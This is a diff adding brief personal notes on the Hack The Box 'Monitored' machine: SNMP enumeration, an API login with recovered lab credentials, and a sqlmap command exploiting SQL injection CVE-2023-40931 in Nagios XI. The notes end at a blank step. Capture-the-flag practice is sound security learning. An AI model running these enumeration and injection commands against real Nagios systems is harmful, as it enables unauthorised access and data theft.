@@ -104,6 +104,22 @@ inner network email phishing
 
 
 ## HTB: Monitored 11 May 2024
+```
+1. nmap found tcp 22,80,389,443,5667. udp: 123 ntp, 161 snmp.
+2. snmp enumeration: snmpwalk -v 2c -c public nagios.monitored.htb
+3. Found username and password in snmp Strings.
+4. The found user is disabled.
+5. https://support.nagios.com/forum/viewtopic.php?p=310411#p310411
+  (login by api request, after getting token, using token to view the page)
+  (curl -XPOST -k -L 'http://nagios.monitored.htb/nagiosxi/api/v1/authenticate' -d 'username=svc&password=XjH7VCehowpR1xZB&valid_min=5')
+6. login by: /nagiosxi/index.php?token=<token>
+7. find Nagios XI version 5.11.0. (CVE-2023-40931)
+  (https://rootsecdev.medium.com/notes-from-the-field-exploiting-nagios-xi-sql-injection-cve-2023-40931-9d5dd6563f8c)
+8. exploit by sqlmap: sqlmap -u "https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3" --batch -p id --cookie="nagiosxi=gmmapc26k5sr7pbm1emj9u4cmc" --dbs --threads=10
+9. 
+
+
+```
 
 ## HTB: Manager 16 Mar 2024
 
